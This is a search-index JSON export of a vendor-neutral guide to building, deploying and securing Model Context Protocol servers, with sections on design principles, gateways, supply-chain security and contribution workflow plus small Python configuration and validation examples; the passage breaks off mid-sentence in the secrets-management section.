{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"\ud83c\udfe0 Home","text":""},{"location":"#mcp-best-practices-guide","title":"MCP Best Practices Guide","text":"<p>This guide provides high\u2011level, vendor\u2011neutral guidance for building, deploying, and operating MCP servers in production. It emphasizes principles and patterns over framework specifics, and favors simple, observable, secure designs that scale.</p>"},{"location":"#what-is-mcp","title":"What is MCP?","text":"<p>The Model Context Protocol (MCP) is an open protocol that standardizes how applications provide context to large language models (LLMs). Think of MCP like a USB-C port for AI applications\u2014it provides a standardized way to connect AI models to different data sources and tools.</p>"},{"location":"#what-this-guide-covers","title":"What This Guide Covers","text":"<p>The guide is organized into practical sections that mirror the MCP server lifecycle.</p> Section Focus Key Topics \ud83e\udded Overview What MCP is and where it fits Core building blocks; when to use MCP; success factors \u2b50 Best Practices Principles that stand the test of production Single responsibility; contracts\u2011first; additive change; stateless defaults \ud83d\udcbb Develop Building servers with discipline Outcomes and contracts; observability from day one; least\u2011privilege integrations \ud83e\uddea Test Validating behavior and quality Unit/integration/E2E; evals and baselines; coverage and CI gates \ud83d\udce6 Package Reliable distribution and supply chain integrity Containers; SBOMs and signing; provenance; trusted catalogs \ud83d\ude80 Deploy Topology and platform guidance Gateway front\u2011door; environment separation; sandboxing; rollout strategies \u2699\ufe0f Operate Lifecycle and day\u20112 excellence SLOs; monitoring and incident flow; catalog and approvals; multi\u2011tenancy \ud83d\udee1\ufe0f Secure Defense\u2011in\u2011depth for MCP Identity and access; policy\u2011as\u2011code; runtime controls; continuous assurance \ud83d\udd0c Use How clients/hosts consume MCP Host choices; gateway mediation; good\u2011citizen patterns"},{"location":"#who-this-guide-is-for","title":"Who This Guide Is For","text":"<ul> <li>Developers building MCP servers and integrations</li> <li>DevOps Engineers deploying and operating MCP infrastructure</li> <li>Engineering Teams adopting MCP in production environments</li> <li>Technical Leaders evaluating MCP for their organizations</li> </ul>"},{"location":"#getting-started","title":"Getting Started","text":"<p>If you're new to MCP, start with:</p> <ol> <li>Overview \u2014 fundamentals and context</li> <li>Best Practices \u2014 essential standards</li> <li>Develop \u2014 building your first server</li> </ol>"},{"location":"#contributing","title":"Contributing","text":"<p>This guide is community\u2011driven. We welcome contributions, corrections, and improvements. The content reflects real\u2011world experience and evolving best practices from the MCP community.</p>"},{"location":"#learn-the-protocol","title":"Learn the Protocol","text":"<p>For protocol details (transports, messages, discovery), refer to the official specification at https://spec.modelcontextprotocol.io. This guide assumes familiarity with the spec and focuses on how to apply it effectively in production.</p> <p>Ready to build production-grade MCP servers? Let's get started! \ud83d\ude80</p>"},{"location":"contribute/","title":"\ud83d\ude4c Contribute","text":""},{"location":"contribute/#contribution-guide","title":"Contribution Guide","text":""},{"location":"contribute/#contributing-to-mcp-best-practices-guide","title":"Contributing to MCP Best Practices Guide","text":"<p>Thank you for your interest in contributing to the MCP Best Practices Guide! This community-driven documentation helps developers build better MCP servers and integrations.</p>"},{"location":"contribute/#getting-started","title":"Getting Started","text":""},{"location":"contribute/#prerequisites","title":"Prerequisites","text":"<ul> <li>Python 3.8+ installed</li> <li>Git configured for your GitHub account</li> <li>Basic familiarity with Markdown and MkDocs</li> </ul>"},{"location":"contribute/#setting-up-your-development-environment","title":"Setting Up Your Development Environment","text":"<ol> <li>Fork the repository on GitHub</li> <li> <p>Clone your fork locally:</p> </li> <li> <p>Set up the development environment:</p> </li> <li> <p>Start the local development server:</p> </li> </ol> <p>This will serve the documentation at http://127.0.0.1:8003/</p>"},{"location":"contribute/#how-to-contribute","title":"How to Contribute","text":""},{"location":"contribute/#workflow-overview","title":"Workflow Overview","text":"<ol> <li>Assign work to yourself using a GitHub issue</li> <li>Browse open issues</li> <li>Comment on an issue to indicate you're working on it</li> <li> <p>Create a new issue if your contribution doesn't have one</p> </li> <li> <p>Create a branch for your changes:</p> </li> <li> <p>Make your changes following the guidelines below</p> </li> <li> <p>Test locally using the Makefile:</p> </li> <li> <p>Submit a pull request when ready</p> </li> </ol>"},{"location":"contribute/#content-guidelines","title":"Content Guidelines","text":""},{"location":"contribute/#page-status-management","title":"Page Status Management","text":"<p>Mark your pages clearly with status indicators:</p> <p>Draft pages:</p> <p>Ready pages:</p>"},{"location":"contribute/#navigation-management","title":"Navigation Management","text":"<ul> <li>Add new pages to the appropriate section in <code>mkdocs.yml</code></li> <li>Use clear, descriptive navigation titles</li> <li>Organize content logically within the existing structure</li> <li>Comment on navigation changes in your pull request</li> </ul>"},{"location":"contribute/#writing-style","title":"Writing Style","text":"<ul> <li>Be practical: Focus on real-world, actionable guidance</li> <li>Be specific: Provide concrete examples and code snippets</li> <li>Be clear: Use simple language and avoid jargon when possible</li> <li>Be consistent: Follow existing patterns and formatting</li> </ul>"},{"location":"contribute/#content-structure","title":"Content Structure","text":"<ul> <li>Use clear headings and subheadings</li> <li>Include code examples where relevant</li> <li>Add links to official MCP documentation where appropriate</li> <li>Provide context for recommendations</li> </ul>"},{"location":"contribute/#technical-guidelines","title":"Technical Guidelines","text":""},{"location":"contribute/#file-organization","title":"File Organization","text":"<ul> <li>Place documentation in the appropriate <code>docs/</code> subdirectory</li> <li>Use kebab-case for file names (e.g., <code>mcp-best-practices.md</code>)</li> <li>Follow the existing directory structure</li> </ul>"},{"location":"contribute/#markdown-standards","title":"Markdown Standards","text":"<ul> <li>Use ATX-style headers (<code>#</code>, <code>##</code>, <code>###</code>)</li> <li>Include code language specifications in fenced code blocks</li> <li>Use relative links for internal documentation references</li> <li>Add alt text for images</li> </ul>"},{"location":"contribute/#code-examples","title":"Code Examples","text":"<ul> <li>Test all code examples before submitting</li> <li>Include language-specific examples where relevant</li> <li>Provide context and explanation for code snippets</li> <li>Follow the coding standards of the respective language</li> </ul>"},{"location":"contribute/#building-and-testing","title":"Building and Testing","text":""},{"location":"contribute/#local-development","title":"Local Development","text":""},{"location":"contribute/#available-make-targets","title":"Available Make Targets","text":"<ul> <li><code>make venv</code> - Create/recreate virtual environment</li> <li><code>make venv-update</code> - Update existing virtual environment</li> <li><code>make serve</code> - Start development server</li> <li><code>make build</code> - Build documentation</li> <li><code>make clean</code> - Remove generated files</li> <li><code>make deploy</code> - Deploy to GitHub Pages (maintainers only)</li> </ul>"},{"location":"contribute/#submitting-changes","title":"Submitting Changes","text":""},{"location":"contribute/#pull-request-process","title":"Pull Request Process","text":"<ol> <li>Create a descriptive PR title that summarizes your changes</li> <li>Fill out the PR description with:</li> <li>Summary of changes</li> <li>Related issue numbers</li> <li> <p>Any special testing instructions</p> </li> <li> <p>Ensure your PR:</p> </li> <li>Builds successfully locally</li> <li>Follows the contribution guidelines</li> <li>Includes appropriate documentation updates</li> <li>Has been tested with <code>make serve</code></li> </ol>"},{"location":"contribute/#review-process","title":"Review Process","text":"<ul> <li>All pull requests require review from maintainers</li> <li>Address feedback promptly and professionally</li> <li>Be prepared to make revisions based on review comments</li> <li>Maintain a collaborative and respectful tone</li> </ul>"},{"location":"contribute/#community-guidelines","title":"Community Guidelines","text":""},{"location":"contribute/#code-of-conduct","title":"Code of Conduct","text":"<ul> <li>Be respectful and inclusive in all interactions</li> <li>Focus on constructive feedback and collaboration</li> <li>Help newcomers and answer questions when possible</li> <li>Assume positive intent in communications</li> </ul>"},{"location":"contribute/#getting-help","title":"Getting Help","text":"<ul> <li>Documentation questions: Open an issue with the <code>question</code> label</li> <li>Technical problems: Check existing issues or create a new one</li> <li>General discussion: Use GitHub Discussions when available</li> </ul>"},{"location":"contribute/#maintenance-and-releases","title":"Maintenance and Releases","text":""},{"location":"contribute/#website-updates","title":"Website Updates","text":"<ul> <li>Changes to the main branch automatically trigger documentation rebuilds</li> <li>Future automation is planned for streamlined deployment</li> <li>Maintainers handle production deployments</li> </ul>"},{"location":"contribute/#content-maintenance","title":"Content Maintenance","text":"<ul> <li>Regular reviews ensure content stays current with MCP developments</li> <li>Community contributions help identify outdated information</li> <li>Version updates are coordinated with MCP protocol releases</li> </ul>"},{"location":"contribute/#recognition","title":"Recognition","text":"<p>Contributors are recognized through:</p> <ul> <li>Attribution in commit messages and release notes</li> <li>GitHub contributor graphs and statistics</li> <li>Community acknowledgment in documentation</li> </ul>"},{"location":"best-practice/","title":"Best Practices","text":""},{"location":"best-practice/#mcp-best-practices-enterprise-guide","title":"MCP Best Practices \u2014 Enterprise Guide","text":"<p>This guide provides high\u2011level, vendor\u2011neutral guidance for building, deploying, and operating MCP servers in production. It emphasizes principles and patterns that scale in enterprise environments, focusing on security, reliability, and maintainability.</p>"},{"location":"best-practice/#what-is-mcp-and-why-it-matters","title":"What Is MCP (and why it matters)","text":"<p>The Model Context Protocol is an open standard that connects AI applications (clients) to the systems where context and actions live (servers). Instead of bespoke, per\u2011app integrations, MCP defines a consistent way to discover capabilities and invoke them safely:</p> <ul> <li>Servers expose tools, resources, and prompts with typed schemas and descriptions.</li> <li>Clients connect over stdio (local) or streamable HTTP (remote) to discover and call capabilities.</li> <li>The protocol enables secure, auditable action execution with clear contracts, making it the preferred standard for building AI tools at enterprise scale.</li> </ul> <p>In this guide, \"AI tools\" are implemented as MCP servers. Treat MCP as the default interface for agent\u2011accessible capabilities.</p>"},{"location":"best-practice/#mcp-core-concepts","title":"MCP Core Concepts","text":"<ul> <li>Tools: Executable actions with explicit input/output schemas, constraints, and side\u2011effect disclosures.</li> <li>Resources: Readable data sources (files, records, documents) the client can fetch for model context.</li> <li>Prompts: Pre\u2011defined interaction templates that standardize tasks and reduce prompt drift.</li> <li>Discovery: Clients enumerate available tools/resources/prompts and obtain schemas at connect time.</li> <li>Authorization: Servers enforce scopes/roles per tool, with optional approvals for high\u2011risk actions.</li> <li>Transports: stdio for local processes; streamable HTTP for remote services and scale\u2011out.</li> </ul>"},{"location":"best-practice/#design-principles","title":"Design Principles","text":"<ul> <li>Single responsibility: One clear domain and authentication boundary per server.</li> <li>Bounded toolsets: Focused tools with specific contracts; avoid \"kitchen\u2011sink\" servers.</li> <li>Contracts first: Strict input/output schemas, explicit side effects, documented errors.</li> <li>Additive change: Version schemas; prefer additive evolution; publish deprecations.</li> <li>Stateless by default: Keep execution stateless for scale and resiliency.</li> <li>Security by design: Integrate identity, authorization, and audit into the server\u2014not around it.</li> <li>Controlled autonomy: Offer precise, least-privilege tools with approval paths for high-impact actions.</li> </ul>"},{"location":"best-practice/#architecture-and-deployment","title":"Architecture and Deployment","text":""},{"location":"best-practice/#transport-and-topology","title":"Transport and Topology","text":"<ul> <li>stdio: Best for local, per-user integrations launched by a client. Strong default isolation; limited for centralized operations.</li> <li>Streamable HTTP: Best for remote, shared services and scale-out. Requires standard web hardening and production SRE practices.</li> <li>Direct vs. gateway: Direct connections are simple; gateway patterns centralize authN/Z, routing, catalogs, and policy enforcement for many servers.</li> </ul>"},{"location":"best-practice/#mcp-gateway-pattern","title":"MCP Gateway Pattern","text":"<p>Use an enterprise MCP Gateway when you need centralized security, control, and scale across many servers and tenants. The gateway becomes the single, policy\u2011enforced ingress for agent access to organizational capabilities.</p> <p>Gateway responsibilities: - Centralized control: Authentication, authorization, routing, rate limiting, quotas, and service discovery/catalog - Security boundary: Terminate TLS, enforce mTLS to backends, broker OAuth tokens/scopes, translate permissions per tool - Policy and guardrails: Apply policy\u2011as\u2011code (e.g., OPA) for tool allow/deny, environment gating, approval requirements - Multi\u2011tenancy: Per\u2011tenant isolation for configs, keys, logs, metrics, limits, and catalogs - Governance and audit: Standardized logging, request correlation, audit trails across all servers - Reliability and scale: HA, autoscaling, circuit breaking, retries with idempotency, backpressure</p> <p></p>"},{"location":"best-practice/#local-vs-remote-deployment","title":"Local vs Remote Deployment","text":"<ul> <li>Local (stdio): Per\u2011user, ephemeral processes; strong isolation, no inbound networking, direct access to local context. Best for developer tools and privacy\u2011sensitive workflows.</li> <li>Remote (HTTP): Shared, multi\u2011tenant services managed by platform teams; central policy, observability, and scaling. Best for enterprise integrations.</li> <li>Hybrid: Local servers for personal context + remote servers for enterprise systems, mediated by a gateway for unified policy.</li> </ul>"},{"location":"best-practice/#multi-tenancy-and-isolation","title":"Multi-tenancy and Isolation","text":"<ul> <li>Single-tenant by default: Simplifies auditing, secrets, and blast radius</li> <li>Explicit tenancy boundaries: Separate data paths, keys, and logs by tenant</li> <li>Workload isolation: Use containers with non-root users, read-only filesystems, minimal base images</li> </ul>"},{"location":"best-practice/#security-foundations","title":"Security Foundations","text":""},{"location":"best-practice/#identity-and-access","title":"Identity and Access","text":"<ul> <li>OAuth 2.0 per MCP specification: Implement authorization flows and token refresh; scope permissions per tool and per action (read vs. write)</li> <li>Least privilege: Default to read-only tools; enable write/edit tools behind explicit roles and policies</li> <li>Fine-grained authorization: Enforce per-tool, per-parameter authorization checks; require approvals for high-risk operations</li> </ul>"},{"location":"best-practice/#inputoutput-safety","title":"Input/Output Safety","text":"<ul> <li>Validate inputs: Enforce strong schemas, types, ranges, and patterns; reject on first failure</li> <li>Sanitize outputs: Prevent injection into downstream systems; clearly label side effects and references</li> <li>Guardrails and approvals: Add policy checks before execution and require user approval where warranted</li> </ul>"},{"location":"best-practice/#secrets-and-transport","title":"Secrets and Transport","text":"<ul> <li>Managed secrets: Store credentials in enterprise secret managers; never inline secrets in configs or code</li> <li>TLS everywhere: Encrypt HTTP transport; sign and verify containers and artifacts; use trusted registries only</li> <li>Network policy: Restrict egress/ingress; apply service-to-service authentication and explicit allowlists</li> </ul>"},{"location":"best-practice/#tooling-discipline","title":"Tooling Discipline","text":""},{"location":"best-practice/#tool-design","title":"Tool Design","text":"<ul> <li>Specific, actionable descriptions: State purpose, constraints, and side effects. Include usage guidance and follow-up steps</li> <li>Stable interfaces: Version tool schemas; prefer additive changes; announce deprecations with timelines</li> <li>Bounded capability: Avoid \"kitchen-sink\" tools; break into focused, testable actions</li> </ul>"},{"location":"best-practice/#toolset-management","title":"Toolset Management","text":"<ul> <li>Read-only mode: Support deployment with read-only tools by configuration</li> <li>Dynamic enablement: Enable/disable tools based on tenant, role, environment, or risk level</li> <li>Production filtering: Exclude destructive operations in production; gate sensitive tools behind approvals</li> </ul>"},{"location":"best-practice/#state-management","title":"State Management","text":"<ul> <li>Stateless by default: Keep execution stateless for scale and resiliency</li> <li>Externalize state: Use managed stores (cache, DB) with clear TTLs and PII handling; avoid hidden server memory</li> </ul>"},{"location":"best-practice/#long-running-and-side-effecting-operations","title":"Long-Running and Side-Effecting Operations","text":"<ul> <li>Asynchronous patterns: For operations exceeding request timeouts, return a handle and provide status/poll tools</li> <li>Idempotency keys: Require client-provided idempotency keys for create/update operations</li> <li>Compensating actions: Document and provide explicit rollback tools where feasible</li> </ul>"},{"location":"best-practice/#scalability-and-reliability","title":"Scalability and Reliability","text":"<ul> <li>Horizontal scale: Design for concurrent, short-lived requests; prefer idempotent operations and safe retries</li> <li>Rate limiting and backpressure: Apply per-tenant, per-tool limits; surface \"try later\" semantics; protect upstream systems</li> <li>Health, readiness, and circuit breakers: Publish health endpoints; trip on dependency failures; shed load gracefully</li> <li>Caching and batching: Cache read-heavy operations with TTL; batch compatible requests to reduce API usage and cost</li> <li>Compatibility and versioning: Version the server, tool schemas, and side-effect contracts; provide feature detection</li> </ul>"},{"location":"best-practice/#performance-practices","title":"Performance Practices","text":"<ul> <li>Concurrency model: Use async I/O for network-bound tools; bound worker pools for CPU tasks; avoid global locks</li> <li>Hot-path optimization: Pre-warm connections, cache tokens, and reuse HTTP clients with timeouts and retries</li> <li>Budgeting: Track token, API, and compute budgets per tenant; shed non-critical work under pressure</li> </ul>"},{"location":"best-practice/#observability-and-governance","title":"Observability and Governance","text":"<ul> <li>Structured audit trails: Capture who/what/when/why, including tool arguments (with redaction), decisions, and outcomes</li> <li>Metrics that matter: Track tool success rate, latency, error classes, approval deferrals, and policy denials</li> <li>Policy as code: Centralize guardrails (e.g., OPA) and apply consistently across environments</li> <li>Curated catalogs: Maintain an approved server catalog with ownership, versions, capabilities, security review dates, and compliance tags</li> </ul>"},{"location":"best-practice/#slos-and-runbooks","title":"SLOs and Runbooks","text":"<ul> <li>SLOs: Define success rate, p95 latency, and error budgets per critical tool</li> <li>Runbooks: Document common failures, dependency outages, rate-limit responses, and rollback steps</li> <li>Change windows: Coordinate releases with dependency owners; pin versions and provide rollbacks</li> </ul>"},{"location":"best-practice/#operations-and-tenancy","title":"Operations and Tenancy","text":"<ul> <li>Environments: Separate dev/stage/prod credentials, routes, policies, quotas; avoid cross\u2011env leakage</li> <li>Tenancy: Per\u2011tenant configs/logs/metrics/limits; tenant\u2011aware authZ; discovery reflects tenant/env differences</li> <li>Quotas &amp; budgets: Per\u2011tenant/tool limits; alerting; auto\u2011degrade non\u2011critical work when over budget</li> <li>Dependency protection: Bounded concurrency, backoff with jitter; strict validation of third\u2011party responses</li> </ul>"},{"location":"best-practice/#build-vs-reuse","title":"Build vs. Reuse","text":"<ul> <li>Prefer official/vendor servers: Start with vendor\u2011provided MCP servers for common SaaS and internal platforms</li> <li>Vet and catalog: Only adopt servers that are maintained, reviewed, versioned, and policy\u2011compliant</li> <li>Extend before rewrite: Contribute fixes upstream or wrap with gateway policies; build custom servers only when gaps are material</li> <li>Exit criteria: If a third\u2011party server falls behind (security, compatibility, maintenance), plan a controlled migration</li> </ul>"},{"location":"best-practice/#testing-and-quality","title":"Testing and Quality","text":"<ul> <li>Cross\u2011model evaluation: Validate tool discovery and execution across hosted and local models; monitor behavioral drift</li> <li>Security tests: Negative testing, authorization bypass attempts, input fuzzing, and rate-limit validation</li> <li>Load and chaos: Establish SLOs; test degradations, dependency outages, and retry/idempotency behavior</li> <li>Pre-release gates: Block releases on failing quality, security, or performance thresholds</li> <li>Contract tests: Maintain tool schema contract tests and golden responses for backward compatibility</li> </ul>"},{"location":"best-practice/#packaging-and-distribution","title":"Packaging and Distribution","text":""},{"location":"best-practice/#containerization-best-practices","title":"Containerization Best Practices","text":"<ul> <li>Minimal base images: Distroless/UBI minimal; remove compilers and shells at runtime; run as non\u2011root</li> <li>Health endpoints: Implement <code>/health</code> and <code>/ready</code>; wire liveness/readiness probes with sane thresholds</li> <li>Provenance: Generate SBOM (e.g., CycloneDX), sign images (cosign), and maintain attestations</li> <li>Dependency hygiene: Pin versions, use lock files, avoid transitive risk; automate vulnerability PRs</li> </ul>"},{"location":"best-practice/#supply-chain-security","title":"Supply Chain Security","text":"<ul> <li>SBOMs: Produce per\u2011build SBOMs and store with artifacts; fail builds on critical vulnerabilities</li> <li>Signing: Sign containers and manifests; verify at deploy; enforce signature policy in clusters</li> <li>Reproducibility: Deterministic builds, pinned bases, and cached layers; record build metadata</li> </ul>"},{"location":"best-practice/#language-and-sdk-choices","title":"Language and SDK Choices","text":"<ul> <li>Python: Fastest iteration, rich data/ML ecosystem, great async I/O for network\u2011bound tools. Mind GIL for CPU tasks and cold\u2011start time.</li> <li>Go: Single static binary, low memory footprint, strong concurrency model. Excellent for high\u2011throughput, low\u2011latency services.</li> <li>TypeScript/Node: Mature ecosystem for web/API tooling, first\u2011class async I/O, easy JSON handling. Good for API wrappers.</li> <li>SDK maturity: Official TypeScript and Python SDKs tend to lead; Go SDK is evolving. Prefer official SDKs; pin versions.</li> </ul> <p>Principle: Choose the language that best matches your operational model and integration profile. Optimize for maintainability, observability, and SLOs\u2014not theoretical speed.</p>"},{"location":"best-practice/#quick-build-checklist","title":"Quick Build Checklist","text":"<p>\u2705 Purpose and scope: Single, clearly defined server role and bounded toolset \u2705 SDK and spec: Official SDK where possible; document SDK/spec versions \u2705 Security: OAuth scopes, least-privilege tools, approvals for high-risk actions, secrets in a manager \u2705 Validation: Strong input schemas, output sanitization, error taxonomy and retries with idempotency \u2705 Operations: Health/readiness, rate limits, backpressure, circuit breakers, and basic SLOs \u2705 Observability: Structured audit logs, metrics (success/latency/errors), tracing/correlation IDs \u2705 Compatibility: Versioned tool schemas, deprecation policy, feature detection, contract tests \u2705 Packaging: Minimal signed container, non\u2011root runtime, reproducible builds \u2705 Docs: README with capabilities/tags, environment variables, runbooks, and changelog  </p>"},{"location":"best-practice/#production-readiness-checklist","title":"Production Readiness Checklist","text":"<p>\u2705 Identity and authorization implemented with least privilege and approvals for high-risk tools \u2705 Input validation, output sanitization, and policy guardrails in place \u2705 Audit logging, metrics, and alerts wired into enterprise observability \u2705 Rate limits, backpressure, health checks, and circuit breakers configured \u2705 Secrets in a managed store; containers minimal, signed, and non-root \u2705 Versioned APIs and tools with clear deprecation paths and compatibility tests \u2705 Documented SLOs, runbooks, incident response, and rollback procedures </p>"},{"location":"best-practice/#enterprise-adoption-patterns","title":"Enterprise Adoption Patterns","text":"<ul> <li>Host responsibilities: Client apps must show full tool descriptions, request approvals for risky actions, and prevent tool shadowing</li> <li>Environment segmentation: Distinct dev/stage/prod; different toolsets and policies per environment</li> <li>Change management: Deprecation policies, version pinning, rollback strategies, and migration guidance</li> </ul> <p>MCP servers succeed in the enterprise when they are treated as durable products: narrowly scoped, strongly governed, observable, and easy to evolve. Favor clarity, safety, and operability over breadth\u2014then scale capabilities through catalogs and consistent patterns rather than bespoke implementations.</p> <p>See also: Overview, Develop, Test, Package, Deploy, Operate, Secure, Use.</p>"},{"location":"deploy/","title":"Deploy","text":""},{"location":"deploy/#deploy","title":"Deploy","text":"<p>Deploy MCP servers behind a gateway on hardened container platforms with strong isolation and guardrails.</p>"},{"location":"deploy/#recommended-topology","title":"Recommended Topology","text":"<ul> <li>MCP Gateway as single pane of glass: centralized authN/Z, routing, quotas, catalogs, policy enforcement, and audit correlation.</li> <li>Separate environments (dev/stage/prod) with distinct credentials, routes, policies, and quotas; prevent cross\u2011environment leakage.</li> </ul>"},{"location":"deploy/#platform-guidance","title":"Platform Guidance","text":"<ul> <li>Kubernetes/OpenShift with:</li> <li>Hardened images (minimal base, non\u2011root), signed artifacts, SBOMs, and vulnerability scanning.</li> <li>Runtime sandboxing (gVisor, Kata Containers) and OS controls (seccomp, SELinux/AppArmor, cgroups).</li> <li>Network policies (least privilege egress/ingress), mTLS service\u2011to\u2011service, and managed secrets.</li> <li>Autoscaling based on SLOs; quotas per tenant; resource requests/limits enforced.</li> </ul>"},{"location":"deploy/#rollout-strategies","title":"Rollout Strategies","text":"<ul> <li>Canary and blue\u2011green with fast rollback and kill switches; monitor p95 latency, error rates, and policy denials during rollout.</li> <li>Shadow traffic where feasible to compare behavior before promotion.</li> </ul>"},{"location":"deploy/#packaging-and-supply-chain","title":"Packaging and Supply Chain","text":"<ul> <li>Package MCP servers as containers for production; sign and verify images; maintain SBOMs and provenance; use curated catalogs and verified registries only.</li> </ul>"},{"location":"deploy/#predeployment-readiness","title":"Pre\u2011Deployment Readiness","text":"<ul> <li>Tests passing; security scans complete; dependencies pinned and current; version tagged.</li> <li>Monitoring and alerting wired; dashboards ready; health/readiness endpoints validated.</li> <li>Configuration and secrets stored securely; network and DNS configured; change plan and rollback steps approved.</li> </ul>"},{"location":"develop/","title":"Develop","text":""},{"location":"develop/#develop-building-production-ready-mcp-servers","title":"Develop \u2014 Building Production-Ready MCP Servers","text":"<p>Build MCP servers using clear contracts and disciplined patterns. Keep implementations simple, observable, and maintainable while following enterprise-grade development practices.</p>"},{"location":"develop/#development-principles","title":"Development Principles","text":""},{"location":"develop/#foundation-principles","title":"Foundation Principles","text":"<ul> <li>Single responsibility: One domain and authentication boundary per server</li> <li>Contracts first: Strict input/output schemas, explicit side effects, documented errors</li> <li>Additive change: Version contracts; prefer backward-compatible evolution with deprecations</li> <li>Stateless by default: Externalize state with TTLs and PII handling; provide async status for long-running work</li> <li>Security by design: Integrate authentication, authorization, and audit from the start</li> <li>Observability first: Instrument from day one with structured logs, metrics, and traces</li> </ul>"},{"location":"develop/#development-mindset","title":"Development Mindset","text":"<ul> <li>Evaluation-driven development: Treat MCP behavior as a product; define success metrics before coding</li> <li>Fail-fast validation: Validate inputs rigorously; reject invalid requests immediately</li> <li>Least-privilege integration: Default to read-only capabilities; require explicit elevation for write operations</li> <li>Dependency awareness: Understand and document external service dependencies and failure modes</li> </ul>"},{"location":"develop/#project-structure-and-standards","title":"Project Structure and Standards","text":""},{"location":"develop/#standardized-repository-structure","title":"Standardized Repository Structure","text":"<p>Every MCP server should follow a consistent project layout for maintainability and operational clarity:</p> <pre><code>mcp-server-name/\n\u251c\u2500\u2500 Containerfile                  # Container build definition\n\u251c\u2500\u2500 Makefile                       # Build, test, and deployment automation\n\u251c\u2500\u2500 pyproject.toml                 # Project and dependency configuration\n\u251c\u2500\u2500 README.md                      # Comprehensive documentation\n\u251c\u2500\u2500 CONTRIBUTING.md                # Contribution guidelines\n\u251c\u2500\u2500 .gitignore                     # Version control exclusions\n\u251c\u2500\u2500 docs/                          # Additional documentation and specs\n\u251c\u2500\u2500 tests/                         # Unit and integration tests\n\u2502   \u251c\u2500\u2500 test_main.py              # Entry point tests\n\u2502   \u2514\u2500\u2500 test_tools.py             # Tool functionality tests\n\u2514\u2500\u2500 src/                          # Application source code\n    \u2514\u2500\u2500 mcp_server_name/          # Main package\n        \u251c\u2500\u2500 main.py               # Entry point and server initialization\n        \u251c\u2500\u2500 server.py             # Server logic and tool registration\n        \u2514\u2500\u2500 tools/                # Tool implementations\n            \u251c\u2500\u2500 tools.py          # Business logic\n            \u2514\u2500\u2500 registry.py       # MCP tool registration\n</code></pre>"},{"location":"develop/#self-containment-requirements","title":"Self-Containment Requirements","text":"<ul> <li>Standalone repositories: Each server must include all necessary code and documentation</li> <li>One-command setup: <code>git clone; make install serve</code> should work out-of-the-box</li> <li>Dependency management: Use <code>pyproject.toml</code> for Python projects; pin all dependencies</li> <li>Clear role definition: State the specific purpose and boundaries of your server</li> </ul>"},{"location":"develop/#development-workflow","title":"Development Workflow","text":""},{"location":"develop/#1-planning-and-design-phase","title":"1. Planning and Design Phase","text":"<p>Define outcomes first: - Identify the specific problem domain and user needs - Define success metrics and evaluation criteria - Document the API contract before implementation - Plan for error scenarios and edge cases</p> <p>Schema-driven development: - Define tool schemas with strong typing (use Pydantic models) - Specify input validation rules and constraints - Document side effects and state changes - Plan for backward compatibility and versioning</p>"},{"location":"develop/#2-implementation-phase","title":"2. Implementation Phase","text":"<p>Start with the contract: </p><pre><code>from pydantic import BaseModel, Field\n\nclass ToolRequest(BaseModel):\n    \"\"\"Well-defined input schema\"\"\"\n    text: str = Field(max_length=1000, description=\"Input text to process\")\n    options: dict = Field(default_factory=dict, description=\"Optional parameters\")\n\nclass ToolResponse(BaseModel):\n    \"\"\"Structured output schema\"\"\"\n    result: str = Field(description=\"Processed result\")\n    metadata: dict = Field(description=\"Operation metadata\")\n</code></pre><p></p> <p>Implement with validation: </p><pre><code>@mcp.tool()\ndef process_text(request: ToolRequest) -&gt; ToolResponse:\n    \"\"\"Process text with full validation and error handling\"\"\"\n    try:\n        # Input validation (beyond schema)\n        if not request.text.strip():\n            raise ValueError(\"Text cannot be empty\")\n        \n        # Business logic\n        result = perform_processing(request.text, request.options)\n        \n        # Return structured response\n        return ToolResponse(\n            result=result,\n            metadata={\"processed_at\": datetime.now().isoformat()}\n        )\n    except Exception as e:\n        logger.error(f\"Processing failed: {e}\")\n        raise\n</code></pre><p></p>"},{"location":"develop/#3-testing-strategy","title":"3. Testing Strategy","text":"<p>Multi-level testing approach: - Unit tests for business logic - Integration tests for MCP protocol compliance - End-to-end tests for complete workflows - Contract tests for schema validation</p> <p>Testing infrastructure: </p><pre><code># Unit testing example\ndef test_tool_logic():\n    \"\"\"Test core business logic independently\"\"\"\n    result = process_text_logic(\"test input\", {})\n    assert result == expected_output\n\n# Integration testing with MCP framework\n@pytest.mark.asyncio\nasync def test_mcp_tool_integration():\n    \"\"\"Test MCP protocol integration\"\"\"\n    # Test tool discovery, schema validation, execution\n    pass\n</code></pre><p></p>"},{"location":"develop/#4-quality-assurance","title":"4. Quality Assurance","text":"<p>Code quality standards: - Static analysis with linters (ruff, mypy, bandit) - Code formatting consistency - Security vulnerability scanning - Dependency license and vulnerability checks</p> <p>Runtime quality: - Performance benchmarking with realistic workloads - Memory usage profiling - Error rate and latency monitoring - Cross-platform compatibility testing</p>"},{"location":"develop/#language-and-technology-choices","title":"Language and Technology Choices","text":""},{"location":"develop/#python-development","title":"Python Development","text":"<p>Recommended stack: - FastMCP or official MCP SDK for rapid development - Pydantic for data validation and serialization - asyncio for concurrent operations - structured logging with correlation IDs</p> <p>Performance considerations: - Use async I/O for network-bound operations - Implement connection pooling for external services - Consider process pools for CPU-intensive tasks - Profile memory usage and implement caching strategically</p>"},{"location":"develop/#go-development","title":"Go Development","text":"<p>When to choose Go: - High-throughput, low-latency requirements - Minimal resource footprint needed - Strong concurrency patterns required - Single binary deployment preferred</p> <p>Go patterns: - Structured error handling with clear error types - Context propagation for cancellation and timeouts - Graceful shutdown handling - Comprehensive testing with table-driven tests</p>"},{"location":"develop/#typescriptnodejs-development","title":"TypeScript/Node.js Development","text":"<p>Optimal use cases: - API integration and webhook handling - Event-driven architectures - Rapid prototyping and iteration - JavaScript ecosystem integration</p> <p>Node.js patterns: - Promise-based async patterns - Stream processing for large data - Event emitter patterns for notifications - Proper error boundary handling</p>"},{"location":"develop/#configuration-and-environment-management","title":"Configuration and Environment Management","text":""},{"location":"develop/#environment-driven-configuration","title":"Environment-Driven Configuration","text":"<pre><code>from pydantic_settings import BaseSettings\n\nclass ServerConfig(BaseSettings):\n    \"\"\"Type-safe configuration management\"\"\"\n    server_name: str = \"mcp-server\"\n    server_port: int = 8000\n    log_level: str = \"INFO\"\n    debug_mode: bool = False\n    \n    # External service configuration\n    api_key: str = Field(..., description=\"Required API key\")\n    api_base_url: str = \"https://api.example.com\"\n    \n    class Config:\n        env_prefix = \"MCP_\"  # Environment variable prefix\n</code></pre>"},{"location":"develop/#secrets-management","title":"Secrets Management","text":"<ul> <li>Never inline 